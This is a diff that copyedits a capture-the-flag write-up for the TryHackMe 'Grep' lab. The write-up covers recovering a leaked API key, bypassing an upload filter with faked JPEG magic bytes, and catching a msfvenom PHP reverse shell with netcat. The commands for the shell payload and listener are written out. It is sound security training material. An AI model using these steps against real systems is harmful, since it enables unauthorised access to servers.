@@ -23,7 +23,7 @@ Link to challenge: [Grep](https://tryhackme.com/room/greprtp)
 
 ## Q1: What is the API key that allows a user to register on the website?
 
-Navigating over to the website which in my case is `http://10.10.2.144/` gives us the "Apache2 Ubuntu Default Page". Cool, at least we know they're running Apache.
+Navigating over to the website, which in my case is `http://10.10.2.144/`, gives us the "Apache2 Ubuntu Default Page". Cool, at least we know they're running Apache.
 
 Next, let's run an ***nmap*** scan and see what we get.
 
@@ -102,7 +102,7 @@ leakchecker.grep.thm (port 51337):
 
 ![02](/pics/ctf-thm-grep/02.webp)
 
-The question wants us to give the API key which allows a user to sign up. Let's navigate over to `grep.thm/public/html/register.php` and have a look.
+The question asks for the API key which allows a user to sign up. Let's navigate over to `grep.thm/public/html/register.php` and have a look.
 
 Trying to sign up gives this error:
 
@@ -189,13 +189,14 @@ This is all well and good for later, most likely, but for now I cannot spot anyt
 
 The SSL certificate for `grep.thm` had "SearchMe" as the organization.
 
-On Github, searching for "serachme" will give us a bunch of results. We can narrow the results down by selecting a language we want to filter by. In this case, the language we most likely want to filter by is PHP. Doing so yields these results:
+On Github, searching for "searchme" will give us a bunch of results. We can narrow the results down by selecting a language we want to filter by. In this case, the language we most likely want to filter by is PHP. Doing so yields these results:
 
 ![08](/pics/ctf-thm-grep/08.webp)
 
 What are we looking for? Let's recap:
-- The app that SuperSecure Corp is building is a blogging platform
-- The repository should be relatively recently updated
+- The app that SuperSecure Corp is building is a blogging platform, so perhaps something that might refer to a content management system
+- As this challenge was created recently, the repository should also be relatively recently updated
+- Something probably written in PHP
 
 Out of the results, this one sticks out to me:
 
@@ -215,7 +216,7 @@ There it is, in commit `db11421`.
 
 Now that we have the API key, we can go ahead and create a user.
 
-I'll be using Burp Suite for this. First, capture the POST request from `https://grep.thm/public/html/register.php`, then editing `X-Thm-Api-Key` value to match what we found earlier.
+I'll be using Burp Suite for this. First, capture the POST request from `https://grep.thm/public/html/register.php`, then by editing `X-Thm-Api-Key` value to match what we found earlier, we should be able to register a new user.
 
 ![11](/pics/ctf-thm-grep/11.webp)
 
@@ -290,14 +291,16 @@ msfvenom -p php/reverse_php LHOST=<YOUR IP HERE> LPORT=4444 -o revshell.php
 2. Add 4 A's (or any character really) to the beginning of the file
 3. Edit the file with ***hexeditor*** and change the values of the 4 first hexadecimal values to *"FF D8 FF E0"* (or to any other of the allowed values)
 
-Now let's try our new file on the upload page (which we also discovered in our ***ffuf*** scan and can be accessed at `https://grep.thm/public/html/upload.php`) and see what happens!
+Now let's try our new file on the upload page. In our ***ffuf*** scan we found a file called `upload.php` and the upload page is accessible to us at `https://grep.thm/public/html/upload.php`. Let's see what happens!
 
-And sure enough we get a beautiful `{"message":"File uploaded successfully."}` message in our browser. Now we just need to navigate over to `https://grep.thm/api/uploads/` which we found earlier in the ***ffuf*** scan and activate the file from there.
+Ah, yes! We get a beautiful `{"message":"File uploaded successfully."}` message in our browser. Now we just need to navigate over to `https://grep.thm/api/uploads/` and activate the file from there.
 
-Listener:
+Set up a listener:
 ```bash
 nc -lvnp 4444
 ```
+
+There is our reverse shell!
 
 Before doing anything else, let's stabilise this netcat shell.
 
@@ -308,10 +311,10 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 2. Then:
 ```bash
-eport TERM=xterm
+export TERM=xterm
 ```
 3. Then background the netcat shell by hitting **CTRL+Z**.
-4. Then turn off your own terminal echo and foreground the netcat shell:
+4. Then turn off your own terminal echo and foreground the netcat shell with:
 ```bash
 stty raw -echo; fg
 ```
